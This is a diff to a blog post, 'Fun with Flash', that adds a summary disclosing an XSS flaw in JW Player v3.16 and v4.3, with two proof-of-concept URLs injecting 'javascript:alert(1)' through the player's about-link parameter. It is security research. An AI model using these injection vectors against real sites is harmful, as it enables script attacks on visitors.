@@ -2,6 +2,12 @@
 layout: post
 title: Fun with Flash
 ---
+## Summary
+JW Player v3.16 and v4.3 have an XSS vulnerability.  It's not serious, though, since it requires user interaction to cause the code to execute.
+
+v3.16 POC:```http://localhost/mediaplayer.swf?aboutlnk=javascript:alert(1)```
+v4.3 POC:```http://localhost/mediaplayer.swf?aboutlink=javascript:alert(1)```
+
 
 ## Intro
 In Frans Rosen’s [talk on bug bounties](https://www.youtube.com/watch?v=KDo68Laayh8), he recommends searching for flash files, since a lot of them are vulnerable.  This got me interested in reading up on Flash files.
